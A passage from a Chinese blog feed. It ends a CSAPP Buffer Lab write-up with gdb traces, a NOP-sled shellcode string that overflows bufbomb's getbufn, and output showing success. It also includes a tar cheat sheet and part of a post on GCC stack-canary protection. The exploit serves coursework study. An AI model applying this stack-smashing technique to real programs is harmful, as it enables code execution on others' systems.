class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-162-156-ubuntu:~/mybuflab_solved$ gdb bufbomb</div><div class="line">GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.3) 7.7.1</div><div class="line">Copyright (C) 2014 Free Software Foundation, Inc.</div><div class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</div><div class="line">This is free software: you are free to change and redistribute it.</div><div class="line">There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;</div><div class="line">and &quot;show warranty&quot; for details.</div><div class="line">This GDB was configured as &quot;i686-linux-gnu&quot;.</div><div class="line">Type &quot;show configuration&quot; for configuration details.</div><div class="line">For bug reporting instructions, please see:</div><div class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</div><div class="line">Find the GDB manual and other documentation resources online at:</div><div class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</div><div class="line">For help, type &quot;help&quot;.</div><div class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...</div><div class="line">Reading symbols from bufbomb...(no debugging symbols found)...done.</div><div class="line">(gdb) break getbufn</div><div class="line">Breakpoint 1 at 0x8048bef</div><div class="line">(gdb) run -n -u xzz</div><div class="line">Starting program: /home/ubuntu/mybuflab_solved/bufbomb -n -u xzz</div><div class="line">Userid: xzz</div><div class="line">Cookie: 0x52f8c747</div><div class="line"></div><div class="line">Breakpoint 1, 0x08048bef in getbufn ()</div><div class="line">(gdb) print $ebp</div><div class="line">$1 = (void *) 0x55683450 &lt;_reserved+1037392&gt;</div><div class="line">(gdb) x /4xw $ebp</div><div class="line">0x55683450 &lt;_reserved+1037392&gt;:	0x55683480	0x08048c2e	0x55686018	0x00000b60</div><div class="line">(gdb) c</div><div class="line">Continuing.</div><div class="line">Type string:1</div><div class="line">Dud: getbufn returned 0x1</div><div class="line">Better luck next time</div><div class="line"></div><div class="line">Breakpoint 1, 0x08048bef in getbufn ()</div><div class="line">(gdb) print $ebp</div><div class="line">$2 = (void *) 0x55683430 &lt;_reserved+1037360&gt;</div><div class="line">(gdb) x /4xw $ebp</div><div class="line">0x55683430 &lt;_reserved+1037360&gt;:	0x55683460	0x08048c2e	0x55686018	0x00000b60</div><div class="line">(gdb) c</div><div class="line">Continuing.</div><div class="line">Type string:2</div><div class="line">Dud: getbufn returned 0x1</div><div class="line">Better luck next time</div><div class="line"></div><div class="line">Breakpoint 1, 0x08048bef in getbufn ()</div><div class="line">(gdb) print $ebp</div><div class="line">$3 = (void *) 0x55683400 &lt;_reserved+1037312&gt;</div><div class="line">(gdb) x /4xw $ebp</div><div class="line">0x55683400 &lt;_reserved+1037312&gt;:	0x55683430	0x08048c2e	0x55686018	0x00000b60</div><div class="line">(gdb) c</div><div class="line">Continuing.</div><div class="line">Type string:3</div><div class="line">Dud: getbufn returned 0x1</div><div class="line">Better luck next time</div><div class="line"></div><div class="line">Breakpoint 1, 0x08048bef in getbufn ()</div><div class="line">(gdb) print $ebp</div><div class="line">$4 = (void *) 0x556833e0 &lt;_reserved+1037280&gt;</div><div class="line">(gdb) x /4xw $ebp</div><div class="line">0x556833e0 &lt;_reserved+1037280&gt;:	0x55683410	0x08048c2e	0x55686018	0x00000b60</div><div class="line">(gdb) c</div><div class="line">Continuing.</div><div class="line">Type string:4</div><div class="line">Dud: getbufn returned 0x1</div><div class="line">Better luck next time</div><div class="line"></div><div class="line">Breakpoint 1, 0x08048bef in getbufn ()</div><div class="line">(gdb) print $ebp</div><div class="line">$5 = (void *) 0x556833e0 &lt;_reserved+1037280&gt;</div><div class="line">(gdb) x /4xw $ebp</div><div class="line">0x556833e0 &lt;_reserved+1037280&gt;:	0x55683410	0x08048c2e	0x55686018	0x00000b60</div><div class="line">(gdb) c</div><div class="line">Continuing.</div><div class="line">Type string:5</div><div class="line">Dud: getbufn returned 0x1</div><div class="line">Better luck next time</div></pre></td></tr></table></figure>
<p>通过调试得到getbufn函数的%ebp值:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">0x55683450</div><div class="line">0x55683430</div><div class="line">0x55683400</div><div class="line">0x556833e0</div><div class="line">0x556833e0</div></pre></td></tr></table></figure></p>
<p>所以我们得到字符串的存储位置为 <code>%ebp-0x208 (520)</code>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">0x55683248</div><div class="line">0x55683228</div><div class="line">0x556831f8</div><div class="line">0x556831d8</div><div class="line">0x556831d8</div></pre></td></tr></table></figure></p>
<p>变化范围为:<code>0x70 (112)</code></p>
<p>同时也能得到testn函数的%ebp值:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">0x55683480</div><div class="line">0x55683460</div><div class="line">0x55683430</div><div class="line">0x55683410</div><div class="line">0x55683410</div></pre></td></tr></table></figure></p>
<p>看出getbufn的<code>%ebp</code>值比testn的<code>%ebp</code> 小 0x30.</p>
<p>我们还有一件最后的事要做：寻找getbufn返回时跳转的合适地址，确保在栈随机的情况下的每次跳转都能执行我们的攻击代码。</p>
<p>根据调试得到的信息，我们得到一张图：</p>
<p><img src="/images/CSAPP-Bufferlab-08.png" alt="level-4"></p>
<p>我们可以</p>
<p>我们将最高的buf地址<code>0x55683248</code>作为跳转地址，将有效机器代码置于跳转地址之前，并将其它所有字符都用作nop指令，此时所有五个buf地址的写入都能满足跳转到地址<code>0x55683248</code>后顺利到达有效机器代码。</p>
<p>所以我们构造的攻击字符：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 8d</div><div class="line">6c 24 28 a1 e4 c1 04 08 68 2e </div><div class="line">8c 04 08 c3 48 32 68 55</div></pre></td></tr></table></figure></p>
<p>执行结果:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-162-156-ubuntu:~/mybuflab_solved$ cat level4.txt | ./hex2raw -n | ./bufbomb -u xzz -n</div><div class="line">Userid: xzz</div><div class="line">Cookie: 0x52f8c747</div><div class="line">Type string:KABOOM!: getbufn returned 0x52f8c747</div><div class="line">Keep going</div><div class="line">Type string:KABOOM!: getbufn returned 0x52f8c747</div><div class="line">Keep going</div><div class="line">Type string:KABOOM!: getbufn returned 0x52f8c747</div><div class="line">Keep going</div><div class="line">Type string:KABOOM!: getbufn returned 0x52f8c747</div><div class="line">Keep going</div><div class="line">Type string:KABOOM!: getbufn returned 0x52f8c747</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这个实验还是挺有趣的。一步步下来，通过反汇编、gdb调试，然后研究反汇编代码发现漏洞，这个过程充满乐趣又有挑战性。实验中，充分理解IA-32的栈帧结构以及过程调用的机制。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;Buffer Lab是传统的32位实验，现在已经被Attack Lab替代。在该实验中，需要利用&lt;code&gt;缓冲区溢出漏洞&lt;/code&gt;生成
    
    </summary>
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/categories/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/tags/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>Linux|Linux命令小抄</title>
    <link href="http://yoursite.com/2018/05/11/Linux-Linux%E5%91%BD%E4%BB%A4%E5%B0%8F%E6%8A%84/"/>
    <id>http://yoursite.com/2018/05/11/Linux-Linux命令小抄/</id>
    <published>2018-05-10T23:16:31.000Z</published>
    <updated>2018-05-10T15:58:35.395Z</updated>
    
    <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>本文章记录自己学习Linux路上的点点滴滴。</p>
<h2 id="文本操作命令"><a href="#文本操作命令" class="headerlink" title="文本操作命令"></a>文本操作命令</h2><h3 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">-c: 建立压缩档案</div><div class="line">-x：解压</div><div class="line">-t：查看内容</div><div class="line">-r：向压缩归档文件末尾追加文件</div><div class="line">-u：更新原压缩包中的文件</div></pre></td></tr></table></figure>
<p>这五个是独立的命令，压缩解压都要用到其中一个，可以和别的命令连用但只能用其中一个。下面的参数是根据需要在压缩或解压档案时可选的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">-z：有gzip属性的</div><div class="line">-j：有bz2属性的</div><div class="line">-Z：有compress属性的</div><div class="line">-v：显示所有过程</div><div class="line">-O：将文件解开到标准输出</div></pre></td></tr></table></figure></p>
<p>下面的参数-f是必须的</p>
<p>-f: 使用档案名字，切记，这个参数是最后一个参数，后面只能接档案名。</p>
<p><code>tar -cf all.tar *.jpg</code><br>这条命令是将所有.jpg的文件打成一个名为all.tar的包。-c是表示产生新的包，-f指定包的文件名。</p>
<p><code>tar -rf all.tar *.gif</code><br>这条命令是将所有.gif的文件增加到all.tar的包里面去。-r是表示增加文件的意思。</p>
<p><code>tar -uf all.tar logo.gif</code><br>这条命令是更新原来tar包all.tar中logo.gif文件，-u是表示更新文件的意思。</p>
<p><code>tar -tf all.tar</code><br>这条命令是列出all.tar包中所有文件，-t是列出文件的意思</p>
<p><code>tar -xf all.tar</code><br>这条命令是解出all.tar包中所有文件，-x是解开的意思</p>
<p>压缩的一些例子</p>
<pre><code>tar –cvf jpg.tar *.jpg  将目录里所有jpg文件打包成tar.jpg
tar –czf jpg.tar.gz *.jpg   将目录里所有jpg文件打包成jpg.tar后，并且将其用gzip压缩，生成一个gzip压缩过的包，命名为jpg.tar.gz
tar –cjf jpg.tar.bz2 *.jpg 将目录里所有jpg文件打包成jpg.tar后，并且将其用bzip2压缩，生成一个bzip2压缩过的包，命名为jpg.tar.bz2
tar –cZf jpg.tar.Z *.jpg   将目录里所有jpg文件打包成jpg.tar后，并且将其用compress压缩，生成一个umcompress压缩过的包，命名为jpg.tar.Z
rar a jpg.rar *.jpg rar格式的压缩，需要先下载rar for linux
zip jpg.zip *.jpg   zip格式的压缩，需要先下载zip for linux
</code></pre><p>解压的一些例子</p>
<pre><code>tar –xvf file.tar  解压 tar包
tar -xzvf file.tar.gz 解压tar.gz
tar -xjvf file.tar.bz2   解压 tar.bz2
tar –xZvf file.tar.Z   解压tar.Z
unrar e file.rar 解压rar
unzip file.zip 解压zip
</code></pre><p>总结</p>
<pre><code>*.tar 用 tar –xvf 解压
*.gz 用 gzip -d或者gunzip 解压
*.tar.gz和*.tgz 用 tar –xzf 解压
*.bz2 用 bzip2 -d或者用bunzip2 解压
*.tar.bz2用tar –xjf 解压
*.Z 用 uncompress 解压
*.tar.Z 用tar –xZf 解压
*.rar 用 unrar e解压
*.zip 用 unzip 解压
</code></pre><h2 id="文本编辑指令"><a href="#文本编辑指令" class="headerlink" title="文本编辑指令"></a>文本编辑指令</h2><h2 id="磁盘操作指令"><a href="#磁盘操作指令" class="headerlink" title="磁盘操作指令"></a>磁盘操作指令</h2><h2 id="网络通信指令"><a href="#网络通信指令" class="headerlink" title="网络通信指令"></a>网络通信指令</h2><h2 id="系统管理指令"><a href="#系统管理指令" class="headerlink" title="系统管理指令"></a>系统管理指令</h2><h2 id="系统设置指令"><a href="#系统设置指令" class="headerlink" title="系统设置指令"></a>系统设置指令</h2><h2 id="其他常见指令"><a href="#其他常见指令" class="headerlink" title="其他常见指令"></a>其他常见指令</h2>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h2&gt;&lt;p&gt;本文章记录自己学习Linux路上的点点滴滴。&lt;/p&gt;
&lt;h2 id=&quot;文本操作命令&quot;&gt;&lt;a href=&quot;#文本操作命令&quot; class=&quot;he
    
    </summary>
    
      <category term="工具" scheme="http://yoursite.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="工具" scheme="http://yoursite.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
      <category term="Linux" scheme="http://yoursite.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>深入理解计算机系统|Linux下缓冲区溢出攻击的原理及对策</title>
    <link href="http://yoursite.com/2018/05/10/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-Linux%E4%B8%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AF%B9%E7%AD%96/"/>
    <id>http://yoursite.com/2018/05/10/深入理解计算机系统-Linux下缓冲区溢出攻击的原理及对策/</id>
    <published>2018-05-09T23:03:40.000Z</published>
    <updated>2018-05-09T15:12:43.328Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.ibm.com/developerworks/cn/linux/l-overflow/index.html" target="_blank" rel="external">Linux下缓冲区溢出攻击的原理及对策</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://www.ibm.com/developerworks/cn/linux/l-overflow/index.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Linux下缓冲区溢出攻击的原理及对策&lt;/a&gt;&lt;/p&gt;

    
    </summary>
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/categories/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/tags/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>深入理解计算机系统|编译器堆栈保护原理</title>
    <link href="http://yoursite.com/2018/05/09/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E7%BC%96%E8%AF%91%E5%99%A8%E5%A0%86%E6%A0%88%E4%BF%9D%E6%8A%A4%E5%8E%9F%E7%90%86/"/>
    <id>http://yoursite.com/2018/05/09/深入理解计算机系统-编译器堆栈保护原理/</id>
    <published>2018-05-09T00:44:38.000Z</published>
    <updated>2018-05-08T17:29:55.187Z</updated>
    
    <content type="html"><![CDATA[<h3 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h3><p>以堆栈溢出为代表的缓冲区溢出已成为最为普遍的安全漏洞。由此引发的安全问题比比皆是。早在 1988 年，美国康奈尔大学的计算机科学系研究生莫里斯 (Morris) 利用 UNIX fingered 程序的溢出漏洞，写了一段恶意程序并传播到其他机器上，结果造成 6000 台 Internet 上的服务器瘫痪，占当时总数的 10%。各种操作系统上出现的溢出漏洞也数不胜数。为了尽可能避免缓冲区溢出漏洞被攻击者利用，现今的编译器设计者已经开始在编译器层面上对堆栈进行保护。现在已经有了好几种编译器堆栈保护的实现，其中最著名的是 StackGuard 和 Stack-smashing Protection (SSP，又名 ProPolice）。</p>
<h3 id="编译器堆栈保护原理"><a href="#编译器堆栈保护原理" class="headerlink" title="编译器堆栈保护原理"></a>编译器堆栈保护原理</h3><p>我们知道攻击者利用堆栈溢出漏洞时，通常会破坏当前的函数栈。例如，攻击者利用清单 1 中的函数的堆栈溢出漏洞时，典型的情况是攻击者会试图让程序往 name 数组中写超过数组长度的数据，直到函数栈中的返回地址被覆盖，使该函数返回时跳转至攻击者注入的恶意代码或 shellcode 处执行。溢出攻击后，函数栈变成了图 2 所示的情形，与溢出前（图 1）比较可以看出原本堆栈中的 EBP，返回地址已经被溢出字符串覆盖，即函数栈已经被破坏。</p>
<pre><code>int vulFunc() {
    char name[10];
    //…
    return 0;
}
</code></pre><p>溢出前的函数栈<br><img src="/images/堆栈溢出-01.jpg" alt="堆栈溢出"></p>
<p>出后的函数栈<br><img src="/images/堆栈溢出-02.jpg" alt="堆栈溢出"></p>
<p>如果能在运行时检测出这种破坏，就有可能对函数栈进行保护。目前的堆栈保护实现大多使用基于 “Canaries” 的探测技术来完成对这种破坏的检测。</p>
<h3 id="“Canaries”-探测"><a href="#“Canaries”-探测" class="headerlink" title="“Canaries” 探测"></a>“Canaries” 探测</h3><p>要检测对函数栈的破坏，需要修改函数栈的组织，在缓冲区和控制信息（如 EBP 等）间插入一个 canary word。这样，当缓冲区被溢出时，在返回地址被覆盖之前 canary word 会首先被覆盖。通过检查 canary word 的值是否被修改，就可以判断是否发生了溢出攻击。</p>
<p>常见的 canary word：</p>
<ul>
<li><p><strong>Terminator canaries</strong><br>由于绝大多数的溢出漏洞都是由那些不做数组越界检查的 C 字符串处理函数引起的，而这些字符串都是以 NULL 作为终结字符的。选择 NULL, CR, LF 这样的字符作为 canary word 就成了很自然的事情。例如，若 canary word 为 0x000aff0d，为了使溢出不被检测到，攻击者需要在溢出字符串中包含 0x000aff0d 并精确计算 canaries 的位置，使 canaries 看上去没有被改变。然而，0x000aff0d 中的 0x00 会使 strcpy() 结束复制从而防止返回地址被覆盖。而 0x0a 会使 gets() 结束读取。插入的 terminator canaries 给攻击者制造了很大的麻烦。</p>
</li>
<li><p><strong>Random canaries</strong><br>这种 canaries 是<code>随机产生</code>的。并且这样的随机数通常不能被攻击者读取。这种随机数在程序初始化时产生，然后保存在一个未被隐射到虚拟地址空间的内存页中。这样当攻击者试图通过指针访问保存随机数的内存时就会引发 segment fault。但是由于这个随机数的副本最终会作为 canary word 被保存在函数栈中，攻击者仍有可能通过函数栈获得 canary word 的值。</p>
</li>
<li><p><strong>andom XOR canaries</strong><br>这种 canaries 是由一个随机数和函数栈中的所有控制信息、返回地址通过异或运算得到。这样，函数栈中的 canaries 或者任何控制信息、返回地址被修改就都能被检测到了。</p>
</li>
</ul>
<p>目前主要的编译器堆栈保护实现，如 Stack Guard，Stack-smashing Protection(SSP) 均把 Canaries 探测作为主要的保护技术，但是 Canaries 的产生方式各有不同。下面以 GCC 为例，简要介绍堆栈保护技术在 GCC 中的应用。</p>
<h3 id="GCC-中的堆栈保护实现"><a href="#GCC-中的堆栈保护实现" class="headerlink" title="GCC 中的堆栈保护实现"></a>GCC 中的堆栈保护实现</h3><p>GCC 4.1 中三个与堆栈保护有关的编译选项</p>
<ul>
<li><p><code>-fstack-protector</code>：启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码。</p>
</li>
<li><p><code>-fstack-protector-all</code>：启用堆栈保护，为所有函数插入保护代码。</p>
</li>
<li><p><code>-fno-stack-protector</code>：禁用堆栈保护。</p>
</li>
</ul>
<h4 id="GCC-中的-Canaries-探测"><a href="#GCC-中的-Canaries-探测" class="headerlink" title="GCC 中的 Canaries 探测"></a>GCC 中的 Canaries 探测</h4><p>下面通过一个例子分析 GCC 堆栈保护所生成的代码。分别使用 <code>-fstack-protector</code> 选项和 <code>-fno-stack-protector</code> 编译清单2中的代码得到可执行文件 demo_sp (-fstack-protector)，demo_nosp (-fno-stack-protector)。</p>
<pre><code>int main() {
    int i;
    char buffer[64];
    i = 1;
    buffer[0] = &apos;a&apos;;
    return 0;
}
</code></pre><p>然后用 gdb 分别反汇编 demo_sp，deno_nosp。</p>
<p>demo_nosp 的汇编代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">(gdb) disas main</div><div class="line">Dump of assembler code for function main:</div><div class="line">0x08048344 &lt;main+0&gt;:    lea    0x4(%esp),%ecx</div><div class="line">0x08048348 &lt;main+4&gt;:    and    $0xfffffff0,%esp</div><div class="line">0x0804834b &lt;main+7&gt;:    pushl  0xfffffffc(%ecx)</div><div class="line">0x0804834e &lt;main+10&gt;:   push   %ebp</div><div class="line">0x0804834f &lt;main+11&gt;:   mov    %esp,%ebp</div><div class="line">0x08048351 &lt;main+13&gt;:   push   %ecx</div><div class="line">0x08048352 &lt;main+14&gt;:   sub    $0x50,%esp</div><div class="line">0x08048355 &lt;main+17&gt;:   movl   $0x1,0xfffffff8(%ebp)</div><div class="line">0x0804835c &lt;main+24&gt;:   movb   $0x61,0xffffffb8(%ebp)</div><div class="line">0x08048360 &lt;main+28&gt;:   mov    $0x0,%eax</div><div class="line">0x08048365 &lt;main+33&gt;:   add    $0x50,%esp</div><div class="line">0x08048368 &lt;main+36&gt;:   pop    %ecx</div><div class="line">0x08048369 &lt;main+37&gt;:   pop    %ebp</div><div class="line">0x0804836a &lt;main+38&gt;:   lea    0xfffffffc(%ecx),%esp</div><div class="line">0x0804836d &lt;main+41&gt;:   ret    </div><div class="line">End of assembler dump.</div></pre></td></tr></table></figure>
<p>demo_sp 的汇编代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">(gdb) disas main</div><div class="line">Dump of assembler code for function main:</div><div class="line">0x08048394 &lt;main+0&gt;:    lea    0x4(%esp),%ecx</div><div class="line">0x08048398 &lt;main+4&gt;:    and    $0xfffffff0,%esp</div><div class="line">0x0804839b &lt;main+7&gt;:    pushl  0xfffffffc(%ecx)</div><div class="line">0x0804839e &lt;main+10&gt;:   push   %ebp</div><div class="line">0x0804839f &lt;main+11&gt;:   mov    %esp,%ebp</div><div class="line">0x080483a1 &lt;main+13&gt;:   push   %ecx</div><div class="line">0x080483a2 &lt;main+14&gt;:   sub    $0x54,%esp</div><div class="line">0x080483a5 &lt;main+17&gt;:   mov    %gs:0x14,%eax</div><div class="line">0x080483ab &lt;main+23&gt;:   mov    %eax,0xfffffff8(%ebp)</div><div class="line">0x080483ae &lt;main+26&gt;:   xor    %eax,%eax</div><div class="line">0x080483b0 &lt;main+28&gt;:   movl   $0x1,0xffffffb4(%ebp)</div><div class="line">0x080483b7 &lt;main+35&gt;:   movb   $0x61,0xffffffb8(%ebp)</div><div class="line">0x080483bb &lt;main+39&gt;:   mov    $0x0,%eax</div><div class="line">0x080483c0 &lt;main+44&gt;:   mov    0xfffffff8(%ebp),%edx</div><div class="line">0x080483c3 &lt;main+47&gt;:   xor    %gs:0x14,%edx</div><div class="line">0x080483ca &lt;main+54&gt;:   je     0x80483d1 &lt;main+61&gt;</div><div class="line">0x080483cc &lt;main+56&gt;:   call   0x80482fc &lt;__stack_chk_fail@plt&gt;</div><div class="line">0x080483d1 &lt;main+61&gt;:   add    $0x54,%esp</div><div class="line">0x080483d4 &lt;main+64&gt;:   pop    %ecx</div><div class="line">0x080483d5 &lt;main+65&gt;:   pop    %ebp</div><div class="line">0x080483d6 &lt;main+66&gt;:   lea    0xfffffffc(%ecx),%esp</div><div class="line">0x080483d9 &lt;main+69&gt;:   ret    </div><div class="line">End of assembler dump.</div></pre></td></tr></table></figure></p>
<p>demo_nosp 的汇编代码中地址为 0x08048344 的指令将 esp+4 存入 ecx，此时 esp 指向的内存中保存的是返回地址。地址为 0x0804834b 的指令将 ecx-4 所指向的内存压栈，由于之前已将 esp+4 存入 ecx，所以该指令执行后原先 esp 指向的内容将被压栈，即返回地址被再次压栈。0x08048348 处的 and 指令使堆顶以 16 字节对齐。从 0x0804834e 到 0x08048352 的指令是则保存了旧的 EBP，并为函数设置了新的栈框。当函数完成时，0x08048360 处的 mov 指令将返回值放入 EAX，然后恢复原来的 EBP，ESP。不难看出，demo_nosp 的汇编代码中，没有任何对堆栈进行检查和保护的代码。</p>
<p>将用 <code>-fstack-protector</code> 选项编译的 demo_sp 与没有堆栈保护的 demo_nosp 的汇编代码相比较，两者最显著的区别就是在函数真正执行前多了 3 条语句：</p>
